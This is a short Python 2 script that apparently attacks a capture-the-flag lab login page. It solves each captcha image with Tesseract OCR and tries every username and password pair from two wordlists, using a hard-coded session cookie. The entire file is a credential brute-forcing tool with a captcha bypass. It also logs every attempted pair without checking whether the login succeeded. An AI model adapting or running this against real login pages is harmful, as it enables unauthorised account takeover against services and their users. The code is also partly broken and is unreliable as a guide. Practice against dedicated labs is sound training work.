# coding:utf-8
import requests
import pytesseract
from PIL import Image


# please set your own cookie
def xcode(code, cookie):
	file = open('./test.png', 'wb')
	ucode = requests.get(code, cookies=cookie)
	for l in ucode.content:
		file.writelines(l)
	file.close()
	im = Image.open('./test.png')
	text = pytesseract.image_to_string(im)
	text = text.replace(" ", '')
	if text.isdigit() and len(text) == 4:
		return text
	else:
		return xcode(code, cookie)


if __name__ == '__main__':
	url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/'
	code = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'
	username = '13388886666'
	submit = 'submit'

	cookie = {'PHPSESSID': 'd9fb00ec5d3578ae6a36dac700bccf52'}
	result = open('./result.txt','w')

    # password file with username file
	for user in open('./user.txt', 'r'):
		username = user.strip()
		for line in open('./pass.txt', 'r'):
			pwd = line.strip()
			text = xcode(code, cookie)
			post = {"username": username, 'password': pwd, 'vcode': text, 'Login': submit}
			res = requests.post(url, data=post, cookies=cookie)
			print >> result, username, pwd

	result.close()